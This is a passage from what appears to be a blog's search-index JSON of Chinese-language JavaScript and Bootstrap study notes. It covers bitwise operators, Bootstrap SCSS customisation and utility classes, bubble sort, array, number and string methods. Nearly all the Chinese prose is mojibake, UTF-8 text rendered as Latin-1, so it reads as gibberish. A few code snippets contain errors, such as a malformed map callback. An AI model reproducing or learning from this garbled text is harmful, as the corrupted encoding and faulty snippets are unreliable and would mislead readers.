æ¸›ä¹˜é™¤ä¸€æ¨£ï¼Œæ‰€ä»¥ä¸ç”¨ç‰¹åˆ¥åœ¨ç”¨æ‹¬è™Ÿæ‹¬èµ·ä¾†ï¼š 1231 &gt;&gt; 2 &gt; 3 // true1 + 1 &gt; 3 // false1 ** 2 &gt; 2 //false","link":"/2021/12/16/bitwise/"},{"title":"Bootstrap å®¢è£½åŒ–","text":"ç ”ç©¶äº†ä¸€æ®µæ™‚é–“æ‰å¼„å‡ºä¾†ï¼Œç­†è¨˜ä¸€ä¸‹ã€‚ ç°¡è¿°é€™é‚Šæ‹¿ utilities ä¾†èˆ‰ä¾‹ã€‚æ¯”å¦‚èªªé è¨­çš„ width æ˜¯æ²’æœ‰æ”¯æ´ breakpoint ä¿®é£¾è©çš„ï¼š w-sm-100 w-md-75 w-lg-50 ä½†å¦‚æœæˆ‘å¸Œæœ›æœ‰é€™å€‹åŠŸèƒ½å‘¢ï¼Ÿç•™åˆ°ä¸‹é¢èªªæ˜ï¼ ä½œæ³•é¦–å…ˆå»ä¸‹è¼‰ Bootstrap çš„æºç¢¼ï¼šSource filesã€‚ æ¥è‘—åˆ° scss è³‡æ–™å¤¾è£¡é¢æ‰¾å‡ºè¦æ”¹çš„åœ°æ–¹ï¼Œé€™é‚Šæ˜¯ _utilitiesï¼š 12345678910111213141516171819D:.â”œâ”€â”€â”€scssâ”‚ â”‚ bootstrap-grid.scssâ”‚ â”‚ bootstrap-reboot.scssâ”‚ â”‚ bootstrap-utilities.scssâ”‚ â”‚ bootstrap.scssâ”‚ â”‚ _accordion.scssâ”‚ â”‚ _alert.scssâ”‚ â”‚ _badge.scssâ”‚ â”‚ _breadcrumb.scssâ”‚ â”‚ _button-group.scssâ”‚ â”‚ _buttons.scssâ”‚ â”‚ â”‚ â”‚ .... ç•¥â”‚ â”‚ â”‚ â”‚ _transitions.scssâ”‚ â”‚ _type.scssâ”‚ â”‚ _utilities.scss &lt;- å°±æ˜¯å®ƒå•¦â”‚ â”‚ _variables.scss æ¥è‘—åƒè€ƒå®˜æ–¹æä¾›çš„ API èªªæ˜ï¼š property å°æ‡‰åˆ°çš„ CSS å±¬æ€§ values å±¬æ€§çš„ key è·Ÿ value class è‡ªè¨‚å‰å¢œå­— state é‡å° hover ä¹‹é¡çš„ç‹€æ…‹ responsive åˆ†ç•Œé»é–‹é—œ å…¶ä»–ç”¨ä¸å¤ªåˆ°æ‰€ä»¥å°±ä¸è§£é‡‹äº†ã€‚ ç¸½ä¹‹å‘¢ï¼Œæˆ‘å¸Œæœ› width ä¹Ÿå¯ä»¥æœ‰åˆ†ç•Œé»ï¼Œæ‰€ä»¥å°±å» _utilities æ‰¾åˆ°é€™æ®µï¼š 1234567891011\"width\": ( property: width, class: w, values: ( 25: 25%, 50: 50%, 75: 75%, 100: 100%, auto: auto )), å¯ä»¥çœ‹åˆ°é è¨­æ²’è¨­å®š responsiveï¼Œæ‰€ä»¥é€™è£¡å®ƒåŠ ä¸Šå»ï¼š 123456789101112\"width\": ( property: width, responsive: true, class: w, values: ( 25: 25%, 50: 50%, 75: 75%, 100: 100%, auto: auto )), æ”¹å®Œä¹‹å¾Œï¼Œè«‹å‹™å¿…è¨˜å¾—ï¼š é‡æ–°ç·¨è­¯ä¸€æ¬¡ bootstrap.scss é‡æ–°ç·¨è­¯ä¸€æ¬¡ bootstrap.scss é‡æ–°ç·¨è­¯ä¸€æ¬¡ bootstrap.scss å‚™è¨»ï¼šå¦‚æœè¦åšæˆ min.css çš„è©±è«‹è¨˜å¾—å†æ‹¿å»å£“ç¸®ã€‚ æ¥è‘—ç·¨è­¯å‡ºä¾†çš„é‚£éš»æª”æ¡ˆå°±æ˜¯æ”¹å¥½çš„ç‰ˆæœ¬äº†ï¼ŒæŠŠå®ƒå¼•å…¥ HTML å°±èƒ½ç”¨äº†ï¼š 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;!-- compile å¾Œçš„æª”æ¡ˆ --&gt; &lt;link rel=\"stylesheet\" href=\"my.css\"&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"w-sm-100 w-md-75 w-lg-50\"&gt; Lorem ipsum dolor, sit amet consectetur adipisicing elit. Iusto cum quisquam incidunt sint, dolor a eos perferendis ratione. Dicta repellat a in corrupti cupiditate non libero quibusdam sunt labore molestiae? &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; ä»¥ä¸Šï¼Œåªè¦æŠŠé€™å€‹ææ‡‚ï¼Œç›¸ä¿¡å…¶ä»–éƒ¨åˆ†ä¹Ÿä¸æœƒæœ‰å¤ªå¤§å•é¡Œã€‚","link":"/2022/02/19/bootstrap-cusomized/"},{"title":"Bootstrap éš¨ç­†è¨˜","text":"é‚Šå­¸é‚Šç´€éŒ„ã€‚ å…¶ä»– æœ‰è‡ªå‹•è¨­å®š border-box &lt;img&gt; è‡ªå¸¶ vertical-align: middle containeråˆ†æˆ container è·Ÿ container-fluidï¼Œå‰è€…æ˜¯æ ¹æ“šä¸‹åœ–åœ¨ä¸åŒåˆ†ç•Œé»è¨­å®š max-widthï¼š å¾Œè€…å°±æ˜¯æ°¸é  100% å¯¬åº¦ã€‚ å¦‚æœä¸æƒ³è¨­ fluid ä½†åˆæƒ³é‡å°æŸäº›è£ç½®åšæ»¿ç‰ˆï¼Œå¯ä»¥åŠ ä¸Šå°¾ç¶´å­—ï¼š 12345&lt;div class=\"container-sm\"&gt;576px ä»¥ä¸‹ 100%&lt;/div&gt;&lt;div class=\"container-md\"&gt;768px ä»¥ä¸‹ 100%&lt;/div&gt;&lt;div class=\"container-lg\"&gt;992px ä»¥ä¸‹ 100%&lt;/div&gt;&lt;div class=\"container-xl\"&gt;1200px ä»¥ä¸‹ 100%&lt;/div&gt;&lt;div class=\"container-xxl\"&gt;1400px ä»¥ä¸‹ 100%&lt;/div&gt; width / heightwidth w-25 w-50 w-75 w-100 w-auto mw-100 height h-25 h-50 h-75 h-100 h-auto mh-100 min-vh-100 vh-100 borderæ–¹å‘borderborder-topborder-endborder-bottomborder-start å¯¬åº¦border border-1border border-2border border-3border border-4border border-5 åœ“è§’roundedrounded-toprounded-endrounded-bottomrounded-startrounded-circlerounded-pill åœ“è§’å°ºå¯¸rounded-0rounded-1rounded-2rounded-3 display d-flex d-inline-flex d-inline d-inline-block d-block d-grid Textå°é½Š text-start text-center text-end ç²—ç´°fw-boldfw-bolderfw-normalfw-lightfw-lighterfst-italicfst-normal å¤§å°å¯« text-lowercase text-uppercase text-capitalize æ–‡å­—å¤§å° fs-1 fs-2 fs-3 fs-4 fs-5 fs-6 é¡è‰² text-primary text-secondary text-success text-danger text-warning text-info text-light text-dark text-body text-muted text-white text-black-50 text-white-50 Flexæ–¹å‘ flex-row flex-row-reverse flex-column flex-column-reverse ä¸»è»¸ justify-content-start justify-content-end justify-content-center justify-content-between justify-content-around justify-content-evenly æ¬¡è»¸ align-items-start align-items-end align-items-center align-items-baseline align-items-stretch å­æ¬¡è»¸ align-self-start align-self-end align-self-center align-self-baseline align-self-stretch æ”¶ç¸® / å±•é–‹ flex-grow-1 flex-shrink-1 æ›è¡Œ flex-nowrap flex-wrap é †åº order-0 order-1 order-2 order-3 order-4 order-5","link":"/2022/02/17/bootstrap-note/"},{"title":"æ³¡æ²«æ’åºæ³•ï¼ˆBubble-sortï¼‰","text":"æ³¡æ²«ï½ æ¦‚å¿µå…©å…©åšæ¯”è¼ƒï¼Œå¦‚æœå³é‚Šæ¯”å·¦é‚Šå¤§å°±æ›ä½ç½®ï¼Œæœ€å¾Œåœ¨æœ€å³é‚Šçš„æ•¸å­—å°±æ˜¯ã€Œæœ€å¤§å€¼ã€ã€‚ å› ç‚ºå¾ˆåƒæ³¡æ³¡ä¸€æ¨£å¾€ä¸Šé£„ï¼Œæ•…å¾—åˆ°ã€Œæ³¡æ²«æ’åºæ³•ã€é€™å€‹åç¨±ã€‚ æµç¨‹åœ–ï¼š æ­¥é©Ÿ12345678910111213let swapped = nulllet sortedCounter = 0let total = array.lengthdo swapped = false let unsortedNumberCount = total - sortedCounter for i 1 to unsortedNumberCount-1 if leftElement &gt; rightElement swap(leftElement, rightElement) swapped = true end for swappCount++while swapped 1234567891011121314ä»¤ swapped = nullï¼ˆä¸€å€‹ flagï¼Œåˆ¤æ–·æ˜¯å¦æ’åºå®Œç•¢ï¼‰ä»¤ sortedCounter = 0ï¼ˆè¨ˆç®—å·²ç¶“æœ‰å¹¾å€‹æ•¸å­—æ’åºå®Œç•¢ï¼‰ä»¤ total = array.lengthï¼ˆå…¨éƒ¨æœ‰å¹¾å€‹æ•¸å­—ï¼‰do swapped = false ï¼ˆè¨­å®š flag åˆå§‹å€¼ï¼Œå¦‚æœæ²’è¢«æ›´æ–°å°±ä¸æœƒæœ‰ä¸‹ä¸€åœˆï¼‰ ä»¤ unsortedNumberCount = å°šæœªæ’åºçš„æ•¸å­—æ•¸é‡ éæ­· 1 åˆ° unsortedNumberCount - 1 å¦‚æœå·¦é‚Šæ•¸å­— &gt; å³é‚Šæ•¸å­— æŠŠå…©å€‹æ•¸å­—äº¤æ› swapped = trueï¼ˆè¨­å®š flagï¼Œä»£è¡¨é‚„æ²’æ’åºå®Œç•¢ï¼‰ è¿´åœˆçµæŸ sortedCounter++ï¼ˆæ›´æ–°å·²æ’åºæ•¸é‡ï¼‰while swapped å¯¦ä½œ123456789101112131415161718192021222324252627282930313233343536373839404142434445464748function bubbleSort(arr) { // åˆ¤æ–·ç”¨çš„ flag let swapped = null // å·²ç¶“æ’åºå¥½çš„æ•¸é‡ let sortedCounter = 0 // ç¸½æ•¸ let total = arr.length // æ’åº do { // è¨­å®š flag åˆå§‹å€¼ swapped = false // æœªæ’åºçš„æ•¸å­—ç¸½æ•¸ const unsortedNumberCount = total - sortedCounter // ç¬¬ä¸€æ¬¡éæ­·ï¼š i from 0 to 18 // ç¬¬äºŒæ¬¡éæ­·ï¼š i from 0 to 17 for (let i=0; i&lt;unsortedNumberCount-1; i++) { // å·¦é‚Š &gt; å³é‚Šå°±äº¤æ›ä½ç½® if (arr[i] &gt; arr[i+1]) { let temp = arr[i] arr[i] = arr[i+1] arr[i+1] = temp // æ›´æ–° flagï¼Œä»£è¡¨è¦åœ¨è·‘ä¸€æ¬¡è¿´åœˆ swapped = true } } // å·²æ’åºå¥½çš„æ•¸é‡ + 1 sortedCounter++ } while (swapped) // å›å‚³çµæœ return arr}/* æ¯”è¼ƒä¸åŒçš„æ’åºæ³•ï¼š bubble: 13 æ¬¡è¿´åœˆ selectionSort 20 æ¬¡è¿´åœˆ*/const numbers = [5, 44, 23, 3, 42, 4, 2, 29, 3, 16, 3, 48, 35, 44, 23, 24, 20, 45, 26, 6]console.log(bubbleSort(numbers))/* [ 2, 3, 3, 3, 4, 5, 6, 16, 20, 23, 23, 24, 26, 29, 35, 42, 44, 44, 45, 48 ]*/","link":"/2022/01/17/bubble-sort/"},{"title":"é™£åˆ—çš„å…§å»ºå‡½å¼","text":"å¸¸ç”¨çš„å…§å»ºå‡½å¼ã€‚ ä¸æ”¹è®ŠåŸæœ¬é™£åˆ—çš„æ–¹æ³•Array.some(function) æ˜¯å¦æœ‰ä¸€å€‹å…ƒç´ ç¬¦åˆå‡½å¼çš„å…§å®¹ 123const array = [2, 4, 5, 7, 10];console.log(array.some(x =&gt; x &gt; 5)) // trueconsole.log(array.some(x =&gt; x &lt; 0)) // false Array.every(function) æ˜¯å¦æ‰€æœ‰å…ƒç´ çš†ç¬¦åˆå‡½å¼çš„å…§å®¹ 123const array = [2, 4, 5, 7, 10];console.log(array.every(x =&gt; x &gt; 0)) // trueconsole.log(array.every(x =&gt; x % 2 === 0)) // false Array.concat(array) æŠŠå…©å€‹é™£åˆ—åˆä½µèµ·ä¾†å¾Œå›å‚³ã€‚ 1234const arr1 = [1, 2, 3]const arr2 = [4, 5, 6]const arr3 = arr1.concat(arr2)console.log(arr3) // [1, 2, 3, 4, 5, 6] Array.join(separator) åœ¨æ¯å€‹å…ƒç´ ä¹‹é–“æ’å…¥ separatorï¼Œçµåˆæˆä¸€å€‹å­—ä¸²å›å‚³ã€‚ 12345const str = 'AbCdEFGhijkLMN'const arr = str.split('')let result = arr.join('ï¼Œ')console.log(result)// Aï¼Œbï¼ŒCï¼Œdï¼ŒEï¼ŒFï¼ŒGï¼Œhï¼Œiï¼Œjï¼Œkï¼ŒLï¼ŒMï¼ŒN Array.slice(start, end) =&gt; åˆ‡å‡ºé™£åˆ—çš„æŸå€‹éƒ¨åˆ†ã€‚æ ¹æ“šæŒ‡å®šçš„èµ·å§‹èˆ‡çµ‚é»ç´¢å¼•å€¼ï¼ˆä¸åŒ…å« endï¼‰ã€‚ å°æŠ€å·§ï¼š ä¸æŒ‡å®š end çš„è©±æœƒè‡ªå‹•ç®—åˆ°æœ€å¾Œä¸€å€‹å…ƒç´  è¼¸å…¥è² æ•¸ä»£è¡¨ã€Œå¾å¾Œé¢æ•¸ä¾†ç¬¬ n å€‹å­—ã€ 1234567const arr = [1, 2, 3, 4, 5]const result1 = arr.slice(0, 4)const result2 = arr.slice(2)const result3 = arr.slice(0, -3)console.log(result1) // [1, 2, 3, 4]console.log(result2) // [3, 4, 5]console.log(result3) // [1, 2] Array.reduce(function, accumulator) å›å‚³é™£åˆ—ç¸½å’ŒåŠ ä¸Š accumulator çš„å€¼ è£œå……ï¼šæ¯ä¸€åœˆçš„ accumulator å€¼ = ä¸Šä¸€åœˆçš„å›å‚³å€¼ 12345const arr = [1, 2, 3]const result = arr.reduce(function(acc, elem) { return acc + elem}, 20)console.log(result) // 6 + 20 = 26 å°æŠ€å·§ï¼šæŠŠ accumulator çš„å€¼è¨­ç‚º 0ï¼ˆä¸è¨­å€¼ä¹Ÿå¯ä»¥ï¼Œä½†ä¸å»ºè­°é€™æ¨£åšï¼‰ï¼Œç­‰æ–¼ç®—å‡ºã€Œé™£åˆ—ç¸½å’Œã€ ï¼ˆæ²’æœ‰æŒ‡å®š accumulator æ™‚ï¼Œfunction æœƒæŠŠé™£åˆ—çš„ç¬¬ä¸€å€‹å…ƒç´ ç•¶ä½œç´¯åŠ å™¨ï¼Œä¸¦ä¸”å¿½ç•¥ç¬¬ä¸€å€‹å…ƒç´ ï¼Œæ‰€ä»¥æ‰æœƒè®Šæˆé™£åˆ—ç¸½å’Œï¼‰ 12345const arr = [1, 2, 3]const result = arr.reduce(function(acc, elem) { return acc + elem})console.log(result) // 6 ä¹˜æ³•ä¹Ÿæ˜¯ä¸€æ¨£çš„æ¦‚å¿µï¼š 12345const arr = [1, 2, 3]const result = arr.reduce(function(acc, elem) { return acc * elem}, 10)console.log(result) // 6 * 10 = 60 Array.find(function) å›å‚³ç¬¬ä¸€å€‹åœ¨ function ä¸­å›å‚³ true çš„å…ƒç´  12345const arr = [1, 2, 3, 5, 10, 7]const result = arr.find(function (element) { return element &gt; 3})console.log(result) // 5 Array.some(function) åªè¦æœ‰ä¸€å€‹å…ƒç´ é€šé function æª¢æŸ¥å°±å›å‚³ trueï¼Œå¦å‰‡å›å‚³ false 12345const arr = [1, 2, 3, 5, 10, 7]const hasEven = arr.some(function (element) { return element % 2 === 0})console.log(hasEven) Array.findIndex(function) å›å‚³ç¬¬ä¸€å€‹åœ¨ function ä¸­å›å‚³ true çš„å…ƒç´ çš„ç´¢å¼•å€¼ 12345const arr = [1, 2, 3, 5, 10, 7]const result = arr.findIndex(function (element) { return element &gt; 3})console.log(result) // 3 Array.includes(value) åˆ¤æ–· value æ˜¯å¦åŒ…å«åœ¨ Array è£¡é¢ï¼Œæ˜¯å°±å›å‚³ trueï¼Œä¸æ˜¯å°±å›å‚³ false 12345const arr = [1, 2, 3]console.log(arr.includes(1)) // trueconsole.log(arr.includes(2)) // trueconsole.log(arr.includes(3)) // trueconsole.log(arr.includes(4)) // false Array.forEach(function) åœ¨ function ä¸­å°æ¯å€‹å…ƒç´ åšä¸€æ®µè™•ç†ã€‚ æ³¨æ„ï¼šé€™å€‹æ–¹æ³•ä¸æœƒæœ‰å›å‚³å€¼ï¼Œæ‰€ä»¥ç•¶æˆæ˜¯ for è¿´åœˆçš„èªæ³•ç³–å°±å¥½äº† 123456const arr = [1, 2, 3]const response = arr.forEach(elem =&gt; console.log(elem)) // output: 1 // output: 2 // output: 3// output: undefined (response çš„å€¼) Array.map(function) åœ¨ function ä¸­å°æ¯å€‹å…ƒç´ åšä¸€æ®µè™•ç†ï¼Œå†åˆ©ç”¨è©² function çš„å›å‚³å€¼ä¾†å»ºç«‹ä¸€å€‹æ–°é™£åˆ—ã€‚ 12345const arr = [1, 2, 3]const result = arr.map(function (element) { return element * 2})console.log(result) // [2, 4, 6] å°æŠ€å·§ï¼šè½‰æ›è³‡æ–™å‹æ…‹æ™‚å¾ˆé©åˆç”¨ map 123const arr =['1', '2', '3']const result = arr.map(elem) =&gt; Number(elem))console.log(result) // [1, 2, 3] å¾Œä¾†ç™¼ç¾å…¶å¯¦é‚„æœ‰æ›´ç°¡å–®çš„åšæ³•ï¼š 123const arr =['1', '2', '3']const result = arr.map(Number)console.log(result) // [1, 2, 3] å¦‚æœä½ æƒ³ç”¨ã€Œå‘½åå‡½å¼ã€ä¾†ç•¶ä½œè¦å‚³å…¥çš„ function ä¹Ÿå¯ä»¥ï¼š 12345678910var arr = [1, 2, 3, 4]var result = arr.map(handler)console.log(result) // [ 1, 32, 243, 1024 ]function double(x, y) { return x ** y}function handler (element) { return double(element, 5)} Array.filter(function) =&gt; åœ¨ function ä¸­å°æ¯å€‹å…ƒç´ åšæ¢ä»¶åˆ¤æ–·ï¼Œæ ¹æ“šè©² function çš„å›å‚³å€¼ä¾†å»ºç«‹ä¸€å€‹æ–°é™£åˆ—ã€‚ true æœƒç•™ä¸‹ï¼Œfalse æœƒè¢«éºæ£„ï¼ˆåªç•™ä¸‹å¥‡æ•¸ï¼‰ï¼š 12345const arr = [1, 2, 3]const result = arr.filter(function (element) { return element &amp; 1})console.log(result) // [1, 3] Array æ–¹æ³•ä¸²ç‡’å¦‚æœå›å‚³å€¼æ˜¯ä¸€å€‹ Arrayï¼Œå°±å¯ä»¥ä¸€ç›´ä½¿ç”¨ Array çš„æ–¹æ³•ä¾†ä¸²æ¥ä¸‹å»ã€‚ ç”¨ map() ä¾†åšä¸²ç‡’ï¼š 12345678910var arr = [1, 2, 3]var result = arr .map(function(element) { return element * 2 }) .map(function(element) { return element + 'yo' })console.log(result) // [ '2yo', '4yo', '6yo' ] ä½ è¦æ··æ­ map()ï¼Œfilter() ä¹Ÿå¯ä»¥ï¼Œä½†è«‹å‹™å¿…ç¢ºèªå‰ä¸€å€‹çš„å›å‚³å€¼æ˜¯ Arrayã€‚ æœƒæ”¹è®ŠåŸæœ¬é™£åˆ—çš„æ–¹æ³•å†æ¬¡å¼·èª¿ï¼Œä»¥ä¸‹æ–¹æ³•éƒ½æœƒæ”¹è®ŠåŸæœ¬çš„é™£åˆ—ï¼ Array.reverse() åè½‰é™£åˆ— è¦æ³¨æ„å›å‚³å€¼ä¹Ÿæ˜¯ä¸€å€‹åè½‰å¾Œçš„é™£åˆ—ï¼š 1234const array1 = [1, 2, 3]const array2 = array1.reverse()console.log(array1) // [3, 2, 1]console.log(array2) // [3, 2, 1] Array.fill(value, start, end) ä»¥æŸå€‹å€¼å¡«æ»¿é™£åˆ— è¦æ³¨æ„å›å‚³å€¼ä¹Ÿæ˜¯ä¸€å€‹å¡«æ»¿å¾Œçš„é™£åˆ—ï¼š 12345const array1 = [1, 2, 3, 4]const array2 = array1.fill('A')console.log(array1) // ['A', 'A', 'A', 'A']console.log(array2) // ['A', 'A', 'A', 'A'] å°æŠ€å·§ï¼š ä¸æŒ‡å®š end çš„è©±æœƒè‡ªå‹•ç®—åˆ°æœ€å¾Œä¸€å€‹å…ƒç´  è¼¸å…¥è² æ•¸ä»£è¡¨ã€Œå¾å¾Œé¢æ•¸ä¾†ç¬¬ n å€‹å­—ã€ 123456const array1 = [1, 2, 3, 4]const array2 = [1, 2, 3, 4]const array3 = array1.fill('A', 1)const array4 = array2.fill('A', 0, -2)console.log(array3) // [1, 'A', 'A', 'A']console.log(array4) // ['A', 'A', 3, 4] Array.splice(start, delete, add) æ’å…¥æˆ–åˆªé™¤å…ƒç´  123const arr = [1, 2, 3, 4, 5]arr.splice(1, 1, 'Yo', 'DJ')console.log(arr) // [1, 'Yo', 'DJ', 3, 4, 5] æ„æ€æ˜¯ï¼šã€Œå¾ç¬¬ 1 å€‹ç´¢å¼•ä½ç½®ï¼Œåˆªé™¤ä¸€å€‹å…ƒç´ ï¼Œæ–°å¢ Yoã€DJ é€™å…©å€‹å…ƒç´ ã€ Array.sort(a, b) å°å…ƒç´ åšæ’åº é è¨­çš„æ’åºæ–¹å¼é è¨­æ˜¯æ ¹æ“šã€ŒUnicodeã€çš„è™Ÿç¢¼ä¾†åšæ’åºï¼ˆç”±å°æ’åˆ°å¤§ï¼‰ï¼Œä½†æˆ‘è¦ºå¾—é€™æ¨£è¨˜ä¹Ÿè »æ–¹ä¾¿çš„ï¼š æŒ‰ç…§ç¬¬ä¸€å€‹ã€Œè‹±æ–‡ã€å­—æ¯æ’åºï¼ˆå°å¯«çš„ Unicode æ¯”å¤§å¯«å¤§ï¼‰ æŒ‰ç…§ç¬¬ä¸€å€‹ã€Œæ•¸å­—ã€æ’åº 123const arr = ['gGsdkfi', 'COKAOS', 'aAdjaod', 'Dkapd', 'Bkoad']arr.sort()console.log(arr) // [ 'Bkoad', 'COKAOS', 'Dkapd', 'aAdjaod', 'gGsdkfi' ] 123const arr = [24, 13, 66, 45, 86, 27, 55]arr.sort()console.log(arr) // [13, 24, 27, 45, 55, 66, 86] è‡ªå®šç¾©æ’åºæ–¹å¼æ ¹æ“š return å€¼ä¾†æ±ºå®šæ’åºæ–¹å¼ï¼Œè©³ç´°è¦å‰‡å¯ä»¥åƒè€ƒ MDNï¼Œé€™è£¡åªå¯«æ¯”è¼ƒæ–¹ä¾¿çš„è¨˜æ³•ï¼š å‡è¨­åˆå§‹çš„æ’åºæ˜¯ a =&gt; b return æ­£æ•¸ ä»£è¡¨ a b äº¤æ›ä½ç½® return è² æ•¸ ä»£è¡¨ a b ä¸äº¤æ›ä½ç½® æ‰€ä»¥å¦‚æœè¦ç”±å°æ’åˆ°å¤§ï¼š 123456const arr = [24, 13, 66, 45, 86, 27, 55]arr.sort(function(a, b) { if(a &gt; b) return 1 if(a &lt; b) return -1})console.log(arr) // [13, 24, 27, 45, 55, 66, 86] å¦‚æœè¦ç”±å¤§æ’åˆ°å°ï¼š 123456const arr = [24, 13, 66, 45, 86, 27, 55]arr.sort(function(a, b) { if(a &gt; b) return -1 if(a &lt; b) return 1})console.log(arr) // [86, 66, 55, 45, 27, 24, 13] æ›´ç°¡æ½”çš„å¯«æ³•ï¼š 12345const arr = [24, 13, 66, 45, 86, 27, 55]arr.sort(function(a, b) { return a - b})console.log(arr) // [13, 24, 27, 45, 55, 66, 86] è§£é‡‹ä¸€ä¸‹ï¼Œå¦‚æœ a-b å¾—åˆ° æ­£æ•¸ï¼Œä»£è¡¨ a æ¯” b å¤§ çš„æ™‚å€™äº¤æ›ä½ç½®ã€‚å¯ä»¥æƒ³æˆæ˜¯ã€Œç¢°åˆ°å¤§çš„å°±äº¤æ›ä½ç½®ã€ï¼Œæ‰€ä»¥å°çš„éƒ½æœƒè¢«æ’åˆ°å¾Œé¢ï¼Œæœ€å¾Œå¾—åˆ°ã€Œç”±å°åˆ°å¤§ã€çš„æ’åºã€‚ 12345const arr = [24, 13, 66, 45, 86, 27, 55]arr.sort(function(a, b) { return b - a})console.log(arr) // [86, 66, 55, 45, 27, 24, 13] è§£é‡‹ä¸€ä¸‹ï¼Œå¦‚æœ b-a å¾—åˆ° æ­£æ•¸ï¼Œä»£è¡¨ a æ¯” b å° çš„æ™‚å€™äº¤æ›ä½ç½®ã€‚å¯ä»¥æƒ³æˆæ˜¯ã€Œç¢°åˆ°å°çš„å°±äº¤æ›ä½ç½®ã€ï¼Œæ‰€ä»¥å¤§çš„éƒ½æœƒè¢«æ’åˆ°å¾Œé¢ï¼Œæœ€å¾Œå¾—åˆ°ã€Œç”±å°åˆ°å¤§ã€çš„æ’åºã€‚ Array.push(element1, [element2, [element3, ...]]) æ–°å¢å…ƒç´ åˆ°é™£åˆ—çµå°¾ è£œå……ï¼šå›å‚³å€¼ç‚ºæ–°çš„é™£åˆ—é•·åº¦ 123const arr = [1, 2]console.log(arr.push(3, 4)) // 4console.log(arr) // [1, 2, 3, 4] Array.pop() ç§»é™¤é™£åˆ—çš„æœ€å¾Œä¸€å€‹å…ƒç´  è£œå……ï¼šå›å‚³å€¼ç‚ºè¢«ç§»é™¤çš„å…ƒç´  123const arr = [1, 2, 3, 4]console.log(arr.pop()) // 4console.log(arr) // [1, 2, 3] Array.unshift(element1, [element2, [element3, ...]]) æ–°å¢å…ƒç´ åˆ°é™£åˆ—é–‹é ­ è£œå……ï¼šå›å‚³å€¼ç‚ºæ–°çš„é™£åˆ—é•·åº¦ 123const arr = [3, 4]console.log(arr.unshift(1, 2)) // 4console.log(arr) // [1, 2, 3, 4] Array.shift() ç§»é™¤é™£åˆ—çš„ç¬¬ä¸€å€‹å…ƒç´  è£œå……ï¼šå›å‚³å€¼ç‚ºè¢«ç§»é™¤çš„å…ƒç´  123const arr = [1, 2, 3, 4]console.log(arr.shift()) // 1console.log(arr) // [2, 3, 4]","link":"/2021/12/20/built-in-function-array/"},{"title":"è·Ÿæ•¸å­—æœ‰é—œçš„å…§å»ºå‡½å¼","text":"å¸¸ç”¨çš„å…§å»ºå‡½å¼ã€‚ Numberè£œå……ï¼šå¤§å¯«çš„å±¬æ€§åç¨±ä»£è¡¨é€™å€‹æ•¸å­—æ˜¯ä¸€å€‹ã€Œå¸¸æ•¸ï¼ˆConstantï¼‰ã€ï¼Œä¹Ÿå°±ä¸æœƒæ”¹è®Šå¾—æ•¸å­—ã€‚ Number.parseInt(str, base) parseInt(str, base) æ ¹æ“šæŒ‡å®šçš„é€²ä½æ–¹å¼ï¼ŒæŠŠå­—ä¸²è½‰æˆæ•¸å­— Number.parseFloat(n) æŠŠå­—ä¸²è½‰æˆæµ®é»æ•¸ï¼Œé€šå¸¸ç”¨åœ¨åšæµ®é»é‹ç®—çš„æƒ…æ³ Number.toFixed() å››æ¨äº”å…¥åˆ°å°æ•¸ç¬¬å¹¾ä½ï¼Œæ³¨æ„å›å‚³å€¼æ˜¯ string 123const numberA = 0.123456console.log(numberA.toFixed(2))console.log(numberA.toFixed(4)) Number.MAX_VALUE åœ¨ JavaScript ä¸­å¯ä»¥å„²å­˜çš„æœ€å¤§æ•¸å­— Number.MIN_VALUE åœ¨ JavaScript ä¸­å¯ä»¥å„²å­˜çš„æœ€å°æ•¸å­— Math.ceil(n) ç„¡æ¢ä»¶é€²ä½ï¼Œå–æ•´æ•¸ Math.floor(n) ç„¡æ¢ä»¶æ¨å»ï¼Œå–æ•´æ•¸ Math.round(n) å››æ¨äº”å…¥ï¼Œå–æ•´æ•¸ Math.sqrt(n) é–‹æ ¹è™Ÿ Math.pow(n, e) æ¬¡æ–¹ Math.abs(n) çµ•å°å€¼ Math.random() éš¨æ©Ÿç”¢ç”Ÿ 0 ~ 0.99999999 Math.max(1,2,3) æ‰¾å‡ºæ•¸å­—ä¸­çš„æœ€å¤§å€¼ random çš„ä½¿ç”¨æ–¹å¼ä»¥å‰é‚„è »ä¸æ¸…æ¥šé€™å€‹çš„ç”¨æ³•çš„ï¼Œæ‰€ä»¥å¯«ä¸‹ä¾†æé†’è‡ªå·±ï¼Œå…¶å¯¦åªè¦å¾æœ€åŸå§‹çš„ç¯„åœä¸‹å»æ€è€ƒå°±å¥½æ‡‚å¤šäº†ï¼š 0 ~ 0.99999999ï¼Œä»¥é€™å€‹ç¯„åœå»æ€è€ƒæƒ³è¦ç”¢ç”Ÿçš„ç¯„åœã€‚ å‡è¨­æƒ³ç”¢ç”Ÿ 0~9 çš„æ•¸å­— =&gt; 0 ~ 9.99999999 è¦é”åˆ°é€™å€‹ç¯„åœï¼Œå¾—å°‡åŸæœ¬çš„ç¯„åœ x 10ï¼š 1Math.random() * 10 å‡è¨­æƒ³ç”¢ç”Ÿ 1~10 çš„æ•¸å­— =&gt; 1 ~ 10.99999999 è¦é”åˆ°é€™å€‹ç¯„åœï¼Œå¾—å°‡åŸæœ¬çš„ç¯„åœ x 10ï¼Œæ¥è‘— + 1ï¼š 1Math.random() * 10 + 1 ä¸æƒ³è¦å°æ•¸é»çš„è©±ï¼Œå¯ä»¥ç”¨ Math.floor() ä¾†ç„¡æ¢ä»¶æ¨å»ï¼š 1Math.floor(Math.random() * 10 + 1) æŠŠæ•¸å­—è½‰æ›æˆè²¨å¹£å¯ä»¥ç”¨ toLocaleString é€™å€‹æ–¹æ³•ä¾†å¯¦ç¾ï¼Œé‚„è »æ–¹ä¾¿çš„ï¼š 123456const total = 13.5;const localeString = total.toLocaleString('en', { style: 'currency', currency: 'TWD'});console.log(localeString); // NT$13.50","link":"/2021/12/20/built-in-function-numbers/"},{"title":"è·Ÿå­—ä¸²æœ‰é—œçš„å…§å»ºå‡½å¼","text":"å¸¸ç”¨åˆ°çš„å…§å»ºå‡½å¼ã€‚ StringString.charCodeAt(n) ç¬¬ n å€‹å­—å…ƒå„²å­˜çš„ ASCII ç¢¼ 1234const str = 'abc'console.log(str.charCodeAt(0)) // 97console.log(str.charCodeAt(1)) // 98console.log(str.charCodeAt(2)) // 99 String.FromCharCode(n) è½‰æ›æˆå°æ‡‰çš„å­—å…ƒï¼ˆn = ASCIIï¼‰ 123456const ASCII1 = 97const ASCII2 = 98const ASCII3 = 